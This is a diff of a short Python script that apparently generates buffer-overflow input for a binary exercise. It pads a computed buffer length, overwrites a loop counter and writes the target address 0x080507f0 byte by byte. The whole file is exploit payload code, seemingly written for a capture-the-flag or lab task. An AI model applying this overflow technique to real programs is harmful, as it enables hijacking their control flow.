@@ -1,14 +1,16 @@
-#! /usr/bin/python3
+#! /usr/bin/python
+
 print("__________")
 
+#            &i   - &buffer
 len_buffer = 0x28 - 0x1c
 
-for i in range(5):
-	print(chr(ord("a") + i) * len_buffer)
+for i in range(24):
+	print("A" + "B" * (len_buffer - 1))
 
-print("A" * len_buffer + chr(9) + chr(0) + chr(0) + chr(0))  # Have to add the zeros because of the \n
-
-"""
-check where the i value is
-check if its getting overwritten
-"""
+# Python 3 for some reason changes \xf0 to \x??c3 something with encoding???
+# 0x080507f0
+print("\xf0" + "B" * (len_buffer - 1))
+print("\x07" + "B" * (len_buffer - 1))
+print("\x05" + "B" * (len_buffer - 1))
+print("\x08" + "B" * (len_buffer - 1) + chr(9) + chr(0) + chr(0) + chr(0))  
